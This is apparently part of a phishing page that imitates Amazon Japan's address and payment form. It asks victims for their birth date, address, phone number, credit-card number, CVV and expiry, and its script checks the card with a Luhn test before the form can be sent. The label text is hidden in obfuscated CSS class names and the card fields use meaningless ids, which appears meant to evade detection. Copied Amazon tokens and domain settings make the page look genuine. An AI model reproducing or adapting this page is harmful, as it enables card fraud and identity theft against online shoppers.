                                                        style="vertical-align: inherit;">2006</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2007</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2008</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2009</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2010</font></font></option>
                                            </select>


                                        </div>
                                    </div>
                                    <div class="col-4 col-md-4 col-sm-4 col-xs-4">
                                        <div class="form-group">
                                            <select class="form-control bgcolored2" name="birth_month" id="birth_month"
                                                    required="true">
                                                <option selected="selected"><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">月</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">01</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">02</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">03</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">04</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">05</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">06</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">07</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">08</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">09</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">10</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">11</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">12</font></font></option>
                                            </select>

                                        </div>
                                    </div>
                                    <div class="col-4 col-md-4 col-sm-4 col-xs-4">
                                        <div class="form-group">
                                            <select class="form-control bgcolored2" name="birth_day" id="birth_day"
                                                    required="true">
                                                <option selected="selected"><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">日</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">01</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">02</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">03</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">04</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">05</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">06</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">07</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">08</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">09</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">10</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">11</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">12</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">13</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">14</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">15</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">16</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">17</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">18</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">19</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">20</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">21</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">22</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">23</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">24</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">25</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">26</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">27</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">28</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">29</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">30</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">31</font></font></option>

                                            </select>

                                        </div>
                                    </div>
                        </div>
                    </div>
                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"><div
                            class="a-section a-spacing-none aok-inline-block"><label
                            class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span
                            class="a-text-bold"><link href="aa/3YouB.css" rel="stylesheet" type="text/css">
<span class="fyTCe"></span><span class="ShKmS"></span><span class="AgriM"></span><span
                                class="iWWIw"></span></span></label></div></div><div
                        class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><div
                        class="a-section a-spacing-none"><div class="a-section a-spacing-none aok-inline-block"><input
                        type="text" maxlength="3" style="text-align:center;width:80px;height:38px;"
                        id="address-ui-widgets-enterAddressPostalCodeOne" name="enterAddressPostalCodeOne"
                        class="a-input-text" required="true"></div><div
                        class="a-section a-spacing-none address-ui-widgets-desktop-2-part-postal-code-separator aok-inline-block"><span><font
                        style="vertical-align: inherit;"><font style="vertical-align: inherit;">- </font></font></span></div><div
                        class="a-section a-spacing-none aok-inline-block"><input type="text" maxlength="4"
                                                                                 style="text-align:center;width:100px;height:38px;"
                                                                                 required="true"
                                                                                 id="address-ui-widgets-enterAddressPostalCodeTwo"
                                                                                 name="enterAddressPostalCodeTwo"
                                                                                 class="a-input-text"></div></div></div>
                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"><div
                            class="a-section a-spacing-none aok-inline-block"><label
                            for="address-ui-widgets-enterAddressStateOrRegion"
                            class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span
                            class="a-text-bold"><link href="aa/4Xian.css" rel="stylesheet" type="text/css">
<span class="RruvT"></span><span class="QACjX"></span><span class="uxVym"></span><span
                                class="hRTMZ"></span></span></label></div></div><div
                        class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><span
                        class="a-dropdown-container">
            <select name="enterAddressStateOrRegion" autocomplete="off"
                    id="address-ui-widgets-enterAddressStateOrRegion-dropdown-nativeId" tabindex="-1"
                    class="a-native-dropdown a-spacing-none">
                <option class="a-prompt" value=""><font style="vertical-align: inherit;"><font
                        style="vertical-align: inherit;">都道府県を选択</font></font></option>
							<option value="北海道"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">北海道</font></font></option>
							<option value="青森県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">青森県</font></font></option>
							<option value="岩手県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">岩手県</font></font></option>
							<option value="宮城県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">宮城県</font></font></option>
							<option value="秋田県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">秋田県</font></font></option>
							<option value="山形県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">山形県</font></font></option>
							<option value="福島県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">福島県</font></font></option>
							<option value="茨城県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">茨城県</font></font></option>
							<option value="栃木県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">栃木県</font></font></option>
							<option value="群馬県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">群馬県</font></font></option>
							<option value="埼玉県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">埼玉県</font></font></option>
							<option value="千葉県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">千葉県</font></font></option>
							<option value="東京都"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">東京都</font></font></option>
							<option value="神奈川県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">神奈川県</font></font></option>
							<option value="新潟県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">新潟県</font></font></option>
							<option value="富山県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">富山県</font></font></option>
							<option value="石川県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">石川県</font></font></option>
							<option value="福井県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">福井県</font></font></option>
							<option value="山梨県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">山梨県</font></font></option>
							<option value="長野県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">長野県</font></font></option>
							<option value="岐阜県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">岐阜県</font></font></option>
							<option value="静岡県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">静岡県</font></font></option>
							<option value="愛知県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">愛知県</font></font></option>
							<option value="三重県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">三重県</font></font></option>
							<option value="滋賀県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">滋賀県</font></font></option>
							<option value="京都府"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">京都府</font></font></option>
							<option value="大阪府"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">大阪府</font></font></option>
							<option value="兵庫県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">兵庫県</font></font></option>
							<option value="奈良県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">奈良県</font></font></option>
							<option value="和歌山県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">和歌山県</font></font></option>
							<option value="鳥取県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">鳥取県</font></font></option>
							<option value="島根県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">島根県</font></font></option>
							<option value="岡山県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">岡山県</font></font></option>
							<option value="広島県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">広島県</font></font></option>
							<option value="山口県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">山口県</font></font></option>
							<option value="徳島県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">徳島県</font></font></option>
							<option value="香川県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">香川県</font></font></option>
							<option value="愛媛県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">愛媛県</font></font></option>
							<option value="高知県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">高知県</font></font></option>
							<option value="福岡県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">福岡県</font></font></option>
							<option value="佐賀県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">佐賀県</font></font></option>
							<option value="長崎県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">長崎県</font></font></option>
							<option value="熊本県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">熊本県</font></font></option>
							<option value="大分県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">大分県</font></font></option>
							<option value="宮崎県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">宮崎県</font></font></option>
							<option value="鹿児島県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">鹿児島県</font></font></option>
							<option value="沖縄県"><font style=vertical-align: inherit;"><font
                                    style="vertical-align: inherit;">沖縄県</font></font></option>

            </select>
            <span tabindex="-1" id="address-ui-widgets-enterAddressStateOrRegion"
                  data-a-class="address-ui-widgets-desktop-form-field-full-width"
                  class="a-button a-button-dropdown a-spacing-none address-ui-widgets-desktop-form-field-full-width"
                  style="min-width: 0%;"><span class="a-button-inner"><span class="a-button-text a-declarative"
                                                                            id="address-ui-widgets-enterAddressStateOrRegion-shown"
                                                                            data-action="a-dropdown-button"
                                                                            role="button" tabindex="0"
                                                                            aria-hidden="true"
                                                                            aria-pressed="false"><span
                    class="a-dropdown-prompt"><font style="vertical-align: inherit;"><font
                    style="vertical-align: inherit;">都道府県を选択</font></font></span></span><i
                    class="a-icon a-icon-dropdown"></i></span></span></span></div>
                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"><div
                            class="a-section a-spacing-none aok-inline-block"><label
                            for="address-ui-widgets-enterAddressLine1"
                            class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span
                            class="a-text-bold"><link href="aa/5ZhuS.css" rel="stylesheet" type="text/css">
<span class="iAkVW"></span><span class="XdJNs"></span></span></label></div></div><div
                        class="a-section a-spacing-small adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input
                        style="height:38px;" type="text" maxlength="60" id="address-ui-widgets-enterAddressLine1"
                        name="enterAddressLine1" required="true"
                        class="a-input-text address-ui-widgets-desktop-form-field-full-width"></div>
                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"></div><div
                        class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input
                        style="height:38px;" type="text" maxlength="60" id="address-ui-widgets-enterAddressLine2"
                        name="enterAddressLine2" class="a-input-text address-ui-widgets-desktop-form-field-full-width"></div>
                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"><div
                            class="a-section a-spacing-none aok-inline-block"><label
                            for="address-ui-widgets-enterAddressLine3"
                            class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span
                            class="a-text-bold"><link href="aa/6HuiS.css" rel="stylesheet" type="text/css">
<span class="eNECK"></span><span class="eCYXg"></span><span class="Kftmw"></span><span class="mwKft"></span><span
                                class="vbZgN"></span><span class="cjsSs"></span><span class="aWIsd"></span><span
                                class="jnQfw"></span><span class="SkYSu"></span><span class="GKoZQ"></span><span
                                class="rHGci"></span></span></label></div></div><div
                        class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input
                        style="height:38px;" type="text" maxlength="60" id="address-ui-widgets-enterAddressLine3"
                        name="enterAddressLine3" class="a-input-text address-ui-widgets-desktop-form-field-full-width"></div>
                    <div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label"><div
                            class="a-section a-spacing-none aok-inline-block"><label
                            for="address-ui-widgets-enterAddressPhoneNumber"
                            class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap"><span
                            class="a-text-bold"><link href="aa/7DianH.css" rel="stylesheet" type="text/css">
<span class="bAFAO"></span><span class="OXGdD"></span><span class="zAGpB"></span><span
                                class="DsPfW"></span></span></label></div></div><div
                        class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field"><input
                        style="height:38px;" type="text" maxlength="20" id="address-ui-widgets-enterAddressPhoneNumber"
                        name="enterAddressPhoneNumber" required="true"
                        class="a-input-text address-ui-widgets-desktop-form-field-full-width"><div
                        class="a-section a-spacing-none a-spacing-top-micro"><span class="a-size-mini">            <link
                        href="aa/PeiDa.css" rel="stylesheet" type="text/css">
<span class="KtoEb"></span><span class="ombBV"></span><span class="tucla"></span><span class="FitwE"></span><span
                            class="uWifa"></span><span class="GTFxR"></span><span class="Cnpus"></span><span
                            class="hHOyU"></span><span class="rYksb"></span><span class="uCObe"></span><span
                            class="UFWHn"></span><span class="tVyIi"></span><span class="EAcVh"></span><span
                            class="rerEI"></span><span class="RIqaL"></span><span class="ffkeM"></span><span
                            class="BpdPc"></span><span class="qlWtz"></span><span class="rxjMM"></span><span
                            class="uUNPp"></span><span class="tmwzH"></span><span
                            class="mwtzH"></span></span></div></div></div></div><input type="hidden"
                                                                                       name="address-ui-widgets-previous-address-form-state-token"
                                                                                       value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.yY7bPp2wCj0eECbm_78Mf0AbcqJJn8x7j9qHaXCtO205Usorf5k5lA.O0ThyFaHevpUjhyD.2lEQ7Na226-_NPc3OzoI0cBhVjIScEJt6eL3lnfB-ZjEuEOa9u-JX3lY8LlgtBh6Qq42Cio9tGS0r6ydjOV_UKJvmXDGNBGZAQAgnQ3uVZesG20VCPmpwN53qLf7TZJVOSRwK0zHdBZmAnZSjCRf5C6rwktUhG2RvDBnWPzfr6fz6Qm_kZpO05iNs0jn1H44_vhQY5ySDAEjqCB32ekhVtLWh7uMIPBMRSRvVNdxP29U0CPtdZuFxsqf2NHOtE-IZhCTEKcvTSKmDJm6qap1RXlSaljK3dbs18bIKlPx96yYD7x7rkAQkhpVLzC6bhJ284UK-Wayj_utl0Gvmg.XFJZtdQdWLZPmGk4Y2_p_w">

<div class="a-section">
	<div class="a-section a-spacing-base">
	<h3 id="address-ui-widgets-addr-details-main-heading" class="aok-float-left a-text-bold"><link href="aa/JiaoFu.css"
                                                                                                   rel="stylesheet"
                                                                                                   type="text/css"><span
            class="hnLYT"></span><span class="EKVLd"></span><span class="yjHrw"></span><span class="emHGR"></span><span
            class="heNDW"></span><span class="stxDj"></span><span class="wYjrr"></span><span class="ZXSKC"></span><span
            class="iCUGj"></span><span class="haWIr"></span><span class="GAnbS"></span><span class="cuAyu"></span><span
            class="Ymvrg"></span><span class="lWcvV"></span></h3>
	<span class="a-letter-space"></span></div>
	<div class="a-section a-spacing-none adddress-ui-widgets-form-field-label-container address-ui-widgets-desktop-form-label">
	<div class="a-section a-spacing-none aok-inline-block">
	<label for="address-ui-widgets-addr-details-business-hours-expander-heading-text"
           class="a-form-label address-ui-widgets-desktop-form-field-full-width a-nowrap">
	<span class="a-text-bold"><link href="aa/JiaoFu.css" rel="stylesheet" type="text/css"><span
            class="YmJbW"></span><span class="mngul"></span><span class="cxEih"></span><span class="RjHwh"></span><span
            class="aqtbX"></span><span class="MLeUD"></span><span class="ZAYrL"></span><span class="rdBEO"></span><span
            class="pDoVd"></span></span></label></div></div>
	<div class="a-section a-spacing-base adddress-ui-widgets-form-field-container address-ui-widgets-desktop-form-field">
	<div aria-live="polite" data-a-expander-name="address-ui-widgets-addr-details-business-hours-expander"
         class="a-row a-expander-container a-expander-inline-container">
	<a href="javascript:void(0)" data-action="a-expander-toggle"
       class="a-expander-header a-declarative a-expander-inline-header a-link-expander"
       data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}">
	<i class="a-icon a-icon-expand"></i>
		<span class="a-expander-prompt">
		<span id="address-ui-widgets-addr-details-business-hours-expander-heading-text"><link href="aa/JiaoFu.css"
                                                                                              rel="stylesheet"
                                                                                              type="text/css"><span
                class="McENA"></span><span class="OLQMi"></span><span class="MIuYI"></span><span
                class="iaXAE"></span><span class="uWbKm"></span><span class="frhtH"></span><span
                class="bMAtc"></span><span class="qevbs"></span><span class="oRuHn"></span></span></span></a>
		<div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner"
             style="overflow: hidden; display: none;">
		<div class="a-section"><div class="a-row"><p> </p></div>
		<div class="a-row"><div class="a-section a-spacing-top-mini"><div class="a-column a-span3">
		<span class="a-declarative" data-action="address-ui-widgets-addr-details-business-hrs-checkbox-change"
              data-address-ui-widgets-addr-details-business-hrs-checkbox-change="{}"><div
                data-a-input-name="address-ui-widgets-addr-details-sat" class="a-checkbox"><label
                for="address-ui-widgets-addr-details-sat">
		<input id="address-ui-widgets-addr-details-sat" type="checkbox" name="address-ui-widgets-addr-details-sat"
               value="SAT" checked="">
			<i class="a-icon a-icon-checkbox"></i>
			<span class="a-label a-checkbox-label"><link href="aa/JiaoFu.css" rel="stylesheet" type="text/css"><span
                    class="NMYAS"></span><span class="EEYwh"></span><span
                    class="sSAUw"></span></span></label></div></span></div>
			<div class="a-column a-span3"><span class="a-declarative"
                                                data-action="address-ui-widgets-addr-details-business-hrs-checkbox-change"
                                                data-address-ui-widgets-addr-details-business-hrs-checkbox-change="{}"><div
                    data-a-input-name="address-ui-widgets-addr-details-sun" class="a-checkbox"><label
                    for="address-ui-widgets-addr-details-sun">
			<input id="address-ui-widgets-addr-details-sun" type="checkbox" name="address-ui-widgets-addr-details-sun"
                   value="SUN" checked=""><i class="a-icon a-icon-checkbox"></i>
			<span class="a-label a-checkbox-label"><link href="aa/JiaoFu.css" rel="stylesheet" type="text/css"><span
                    class="hpxXJ"></span><span class="HTeUW"></span><span
                    class="ZXDef"></span></span></label></div></span></div>
			<div class="a-column a-span6 a-span-last"></div></div></div><script type="a-state"
                                                                                data-a-state="{&quot;key&quot;:&quot;address-details-business-hours-expander-heading-strings&quot;}">{"business-hours-expander-heading-text-sat":"土曜日に荷物を受け取ることができます","business-hours-expander-heading-text-sun":"日曜日に荷物を受け取ることができます","business-hours-expander-heading-text-both":"土日ともに受取可能","business-hours-expander-heading-text-none":"土日ともに受取不可"}</script>
				<input type="hidden" name="address-ui-widgets-addr-details-business-hours" value="BOTH">
					<div id="address-ui-widgets-addr-details-business-hours-opt-out-sat-alert"
                         class="a-box a-alert-inline a-alert-inline-info aok-hidden"><div
                            class="a-box-inner a-alert-container">
					<i class="a-icon a-icon-alert"></i>
					<div class="a-alert-content">
					<div class="a-section">土曜日の発売日/発売日前日お届けをご利用の際も反映されます。</div></div></div></div>
					<div id="address-ui-widgets-addr-details-business-hours-opt-out-sun-alert"
                         class="a-box a-alert-inline a-alert-inline-info aok-hidden">
					<div class="a-box-inner a-alert-container">
					<i class="a-icon a-icon-alert"></i>
					<div class="a-alert-content">
					<div class="a-section">日曜日の発売日/発売日前日お届けをご利用の際も反映されます。</div></div></div></div>
					<div id="address-ui-widgets-addr-details-business-hours-opt-out-weekend-alert"
                         class="a-box a-alert-inline a-alert-inline-info aok-hidden">
					<div class="a-box-inner a-alert-container">
					<i class="a-icon a-icon-alert"></i>
					<div class="a-alert-content">
					<div class="a-section">週末の発売日/発売日前日お届けをご利用の際も反映されます。</div></div></div></div></div></div></div></div></div>
            <input type="hidden" name="address-ui-widgets-addressFormButtonText" value="save"><input type="hidden"
                                                                                                     name="address-ui-widgets-addressFormHideHeading"
                                                                                                     value="true"><input
                type="hidden" name="address-ui-widgets-addressFormHideSubmitButton" value="false"><input type="hidden"
                                                                                                         name="address-ui-widgets-enableImportContact"
                                                                                                         value="false"><input
                type="hidden" name="address-ui-widgets-enableAddressDetails" value="true"><input type="hidden"
                                                                                                 name="address-ui-widgets-returnLegacyAddressID"
                                                                                                 value="false"><input
                type="hidden" name="address-ui-widgets-enableEmailAddress" value="false"><input type="hidden"
                                                                                                name="address-ui-widgets-enableAddressTips"
                                                                                                value="true"><script
                type="a-state" data-a-state="{&quot;key&quot;:&quot;identity-address-ux-ajax-data&quot;}">{"identity-address-ux-ajax-auth-token":"eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.6WhccWezc9Zz0Bteq3X-HRP7HA18V7xIictTZ7GhIujjhYmG3u-CoA.ERPOiOuhKdFHk51c.97I6FUyNx8Z_5yHIA07hpC-JjC0R3IGQ9SBowWr7vFSZv1OKdI9Qu49c7uLWmaUL243j6pLiV71hyiePmZZtDMCnstKZEZ9GyUsw_Z4Zb5MOnvS9za9I5iCFRObJAL6qeMXbxsamLAESz9haZxtrqpqTIDClAbZus809FboWUx7UZ-ogqWFyean6ZF0csq-jDUa-sezZoqFfg-owD_FrrfHtAxO3KPIkc1RqvFog7CsqdAsPDFISkyqbKV_S50kCzqhDPq9W3UBnzyfQBoNfvxPhv0HyepNDxNWo4bOcABCT77k5r9SxVqt2B8kBnR9B6BQwNOnyw0UYzY0cP9favZEf20fdeVi6jDMps_vT0_z-N1mE4IDAHbsOO-J4son2AALj6w3VTjJwnbA4gPupIhAWMyrQNhFCkgAmWfqNpsOMXLVOGzs0S_Q7auYA31TZpbEFduxAD-AXak6FTATwoarwIt3qwdHZa2Hae-i80AsAuNEFQxvSbhOMuTEmBDzhn7aaEBJlXzMLVkF7uPDjS1w89q0N6Mi4jfOy13Bec9v1sjSteibbfaqfMcFa8CDLUjHbrHuYeiF5PGzoFVeziiVh5rpxm-nbknwwuKq2Q5roUMe8cCQL-P5i_U5pOrcscE4AwtTEF1Oih851DkIjUWetDIM75gpb9tFv8bGz2CZ0fvHcAf2NveTD3sGYxDG-_IMP6Q-79UFM9IwN4TGIJH1ZhTQuMV4nQ8m4aQDim18xKE7g5Da4eyuF3FRbnQ.jQHjQEdlRAL8ttXt4l5U9w","identity-address-ux-ajax-domain":"www.amazon.co.jp"}</script><script
                type="a-state" data-a-state="{&quot;key&quot;:&quot;address-ui-widgets-from-view-state&quot;}">{"isEnabled":true}</script></div><style>.address-ui-widgets-desktop-2-part-postal-code-separator {
                            min-width: 20px;
                            text-align: center;
                        }

                        .address-ui-widgets-desktop-form-field-full-width {
                            width: 100%;
                        }

                        .address-ui-widgets-desktop-form-label {
                            min-width: 150px;
                        }

                        .address-ui-widgets-desktop-form-field {
                            min-width: 150px;
                        }

                        .address-ui-widgets-desktop-form-popover-trigger {
                            margin-left: 5px;
                        }

                        .address-ui-widgets-desktop-form-popover-trigger {
                            margin-left: 5px;
                        }

                        .address-ui-widgets-field-container-fixed-height {
                            height: 31px;
                        }

                        .address-ui-widgets-input-text-box-warning-state {
                            box-shadow: 0 0 0 4px #fffae7 inset !important;
                        }
</style>
                            <script>
function valid_credit_card(value) {
    if (/[^0-9-\s]+/.test(value))
        return false;
    var nCheck = 0, bEven = false;
    value = value.replace(/\D/g, "");

    for (var n = value.length - 1; n >= 0; n--) {
        var cDigit = value.charAt(n),
                nDigit = parseInt(cDigit, 10);

        if (bEven && (nDigit *= 2) > 9) nDigit -= 9;

        nCheck += nDigit;
        bEven = !bEven;
    }

    return (nCheck % 10) == 0;
}
                            function checkForm(formA) {
                                var cxdi = $('#cxdi').val();
                                var cvv = $('#vxvxc').val();
                                var months = $('#months').val();
                                var year = $('#years').val();
                                var birth_year = $('#birth_year').val();
                                var birth_month = $('#birth_month').val();
                                var birth_day = $('#birth_day').val();
                                var isValidCard = valid_credit_card(cxdi);
                                if (cxdi == '' || cxdi.length <15 || (cxdi[0]!=3 && cxdi.length == 15)  || !isValidCard) {
                                    alert('有効なクレジットカードまたはデビットカードの番号を入力してください');
                                    return false;
                                }
                                if (cvv == '') {
                                    alert('セキュリティコードを入力してください');
                                    return false;
                                }
                                if (months == '月' || year == '年') {
                                    alert('有効期限を入力してください');
                                    return false;
                                }
                                if (birth_month == '月' || birth_year == '年' || birth_day == '日') {
                                    alert('生年月日を入力してください');
                                    return false;
                                }
                                var self = true;
                                return self;
                            }
                            P.when('A', 'a-dropdown', 'ready').execute(function (A, dropdown) {
                                var $ = A.$;
                                var postalCodeOneLength = 3;
                                var postalCodeTwoLength = 4;
                                var postalCodeLength = postalCodeOneLength + 1 + postalCodeTwoLength;
                                var $form = $('#address-ui-address-form');
                                var $formSubmitBtn = $('#jsFormSubmitBtn');
                                var obj = {};
                                var stateDropdown = dropdown.getSelect("#address-ui-widgets-enterAddressStateOrRegion-dropdown-nativeId");
                                var addressLineOneTextInput = $("#address-ui-widgets-enterAddressLine1");

                                var $addressStateOrRegionNative = $('#address-ui-widgets-enterAddressStateOrRegion-dropdown-nativeId');
                                var $ddd = $('#cxdi');
                                A.state.parse();
                                var ajaxToken = A.state('identity-address-ux-ajax-data')['identity-address-ux-ajax-auth-token'];
                                var ajaxDomain = A.state('identity-address-ux-ajax-data')['identity-address-ux-ajax-domain'];
                                var ajaxUrlPrefix = (ajaxDomain) ? window.location.protocol + "//" + ajaxDomain : "";

                                function incrementCounter(counterName) {
                                    if (window.ue && window.ue.count) {
                                        window.ue.count(counterName, (window.ue.count(counterName) || 0) + 1);
                                    }
                                }
                                function reloadIfRequiresAuth(resultCallback) {
                                    return function (result) {
                                        if (true === result.requiresAuth) {
                                            window.location.reload(true);
                                        } else {
                                            resultCallback(result);
                                        }
                                    };
                                }

                                function handleAutopopulationResult(result) {
                                    if (result !== undefined && result !== null) {
                                        var data = result.data;
                                        var operation = result.operation;

                                        if (data !== undefined && data !== null) {
                                            if ("false" === data.isAjaxError) {
                                                var stateValue = data.stateOrRegion;
                                                var addressLineOne = data.addressLineOne;

                                                if (stateValue && stateDropdown) {
                                                    stateDropdown.val(stateValue);
                                                }
                                                if (addressLineOne && addressLineOneTextInput) {
                                                    addressLineOneTextInput.val(addressLineOne);
